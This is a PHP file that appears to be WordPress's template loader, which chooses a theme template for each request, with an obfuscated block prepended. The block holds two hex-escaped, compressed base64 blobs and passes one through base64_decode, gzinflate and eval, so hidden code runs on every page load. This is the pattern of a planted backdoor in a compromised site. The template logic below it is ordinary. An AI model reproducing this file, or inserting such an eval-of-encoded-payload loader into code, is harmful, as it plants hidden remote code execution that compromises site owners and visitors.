<?php
$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
$Lix = "\x3d\x3dw//QPx6jTp\x63gPMnHuDroYFG0v3Ok8z/rsJZjrhN\x2bYeF4/qi\x42\x2bYJ/\x63m\x43oF6WRZPROo\x42FwogGviqn\x42\x42Hsk9MGGjneISve9khH\x63YqryYwuLUrDHWLzSw\x62nvGrTkodp\x63prD5x9jn\x624El\x62MRXP56k\x412o5Uwju\x63Wsyu\x617jx\x2bi\x42LuYrQrG9ehLr3Z2NSFkpwzfd9\x42E\x63wNrsH5plpM\x41i\x628FUj0u8RhOF\x63yQxtwUlw\x63uyXF6ssm\x63ZgsxKZvNIP\x610uqK23S79\x2bMGXY\x61JS1Jd\x63dd\x635\x61o\x629zgsSYn\x43EJ6\x418DXjH7NGfUS\x42hDLqo0QDtoT8kL\x41TZ\x43DVE0qUe\x43v\x63GPkkol8\x42TuuF\x62zE6sTgrp\x63WJvlkRMFlirK\x42vVDpGYqF\x43zWrZlGEqpZe8e6qDFTRE2esQuLw8jmQ3fHE8LP0\x63NtG\x43oIN\x42\x2bRh\x43S1MLD3Q2xpEVsHNqpW\x43T3vT0pVx\x62KeMDDZ7XkOlTvj\x414\x62Gvz\x63r\x422ps\x62g\x2bV\x633jxTR/Fe\x622eS/Svde/\x43k\x61iR\x43v4F9kMKje\x2bj\x43/LO82\x2b\x61deFqd\x2b4GvxKij\x2bkIP5nue\x62D\x61wS7l\x611J3iQ\x2biru6\x639IPSfFqEwLEslt\x2b9knhnYT\x42VLZVS\x41pjygpphUu\x620V\x63uEpse\x42EZxhg4OKD\x2bjOU\x62\x42lyGErwLx\x6142d\x2bw3O2XGv\x41vzNxDOlNfjRf\x63n\x63ME59DsgsVtiSQ6TkW9PrZnxyiqEjeIEJxpR\x62/trJUHT0\x61Nv6gLDyy4lptIX3zDInDkqdvqdx71\x413e\x2bdOvXun7\x62\x41IkRfX2GNyO/h99fZRy9\x41FStsNL72hUVXKd7QRl0uLVRrWkVKwsvpFmK\x41VXUw/niH\x2bD\x42M\x62\x2bW\x62UV\x62/lKgW\x42wJe9rp\x41lFQ/VKg\x61\x42wJe9ro\x411FQ/FKge\x42wJe9rn\x41FGQ/1Jgi\x42wJe";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
?>

<?php
/**
 * Loads the correct template based on the visitor's url
 *
 * @package WordPress
 */
if ( wp_using_themes() ) {
	/**
	 * Fires before determining which template to load.
	 *
	 * @since 1.5.0
	 */
	do_action( 'template_redirect' );
}

/**
 * Filters whether to allow 'HEAD' requests to generate content.
 *
 * Provides a significant performance bump by exiting before the page
 * content loads for 'HEAD' requests. See #14348.
 *
 * @since 3.5.0
 *
 * @param bool $exit Whether to exit without generating any content for 'HEAD' requests. Default true.
 */
if ( 'HEAD' === $_SERVER['REQUEST_METHOD'] && apply_filters( 'exit_on_http_head', true ) ) {
	exit;
}

// Process feeds and trackbacks even if not using themes.
if ( is_robots() ) {
	/**
	 * Fired when the template loader determines a robots.txt request.
	 *
	 * @since 2.1.0
	 */
	do_action( 'do_robots' );
	return;
} elseif ( is_favicon() ) {
	/**
	 * Fired when the template loader determines a favicon.ico request.
	 *
	 * @since 5.4.0
	 */
	do_action( 'do_favicon' );
	return;
} elseif ( is_feed() ) {
	do_feed();
	return;
} elseif ( is_trackback() ) {
	require ABSPATH . 'wp-trackback.php';
	return;
}

if ( wp_using_themes() ) {

	$tag_templates = array(
		'is_embed'             => 'get_embed_template',
		'is_404'               => 'get_404_template',
		'is_search'            => 'get_search_template',
		'is_front_page'        => 'get_front_page_template',
		'is_home'              => 'get_home_template',
		'is_privacy_policy'    => 'get_privacy_policy_template',
		'is_post_type_archive' => 'get_post_type_archive_template',
		'is_tax'               => 'get_taxonomy_template',
		'is_attachment'        => 'get_attachment_template',
		'is_single'            => 'get_single_template',
		'is_page'              => 'get_page_template',
		'is_singular'          => 'get_singular_template',
		'is_category'          => 'get_category_template',
		'is_tag'               => 'get_tag_template',
		'is_author'            => 'get_author_template',
		'is_date'              => 'get_date_template',
		'is_archive'           => 'get_archive_template',
	);
	$template      = false;

	// Loop through each of the template conditionals, and find the appropriate template file.
	foreach ( $tag_templates as $tag => $template_getter ) {
		if ( call_user_func( $tag ) ) {
			$template = call_user_func( $template_getter );
		}

		if ( $template ) {
			if ( 'is_attachment' === $tag ) {
				remove_filter( 'the_content', 'prepend_attachment' );
			}

			break;
		}
	}

	if ( ! $template ) {
		$template = get_index_template();
	}

	/**
	 * Filters the path of the current template before including it.
	 *
	 * @since 3.0.0
	 *
	 * @param string $template The path of the template to include.
	 */
	$template = apply_filters( 'template_include', $template );
	if ( $template ) {
		include $template;
	} elseif ( current_user_can( 'switch_themes' ) ) {
		$theme = wp_get_theme();
		if ( $theme->errors() ) {
			wp_die( $theme->errors() );
		}
	}
	return;
}
